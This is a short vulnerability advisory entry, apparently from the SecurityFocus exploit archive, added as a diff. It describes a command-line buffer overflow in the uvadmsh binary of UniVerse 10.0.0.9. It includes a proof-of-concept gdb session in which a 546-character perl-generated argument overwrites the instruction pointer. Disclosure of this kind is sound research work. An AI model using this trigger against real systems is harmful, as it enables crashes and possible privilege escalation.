@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/8209/info
+
+Under certain configurations, UniVerse allows the 'uvadm' user to perform certain administration tasks for the software. It has been reported that the uvadmsh binary does not perform bounds checking when parsing command-line arguments. Because access to the vulnerable option is restricted to the uvadm user, other users may not be able to exploit this vulnerability.
+
+While this vulnerability was reported in UniVerse version 10.0.0.9, previous versions are likely vulnerable as well.
+
+(gdb) r -uv.install `perl -e 'print "Z" x 546'`
+Starting program: uvadmsh -uv.install `perl -e 'print "Z" x 546'`
+error
+
+Program received signal SIGSEGV, Segmentation fault.
+0x5a5a5a5a in ?? ()
+(gdb) bt
+#0 0x5a5a5a5a in ?? ()
+Cannot access memory at address 0x5a5a5a5a
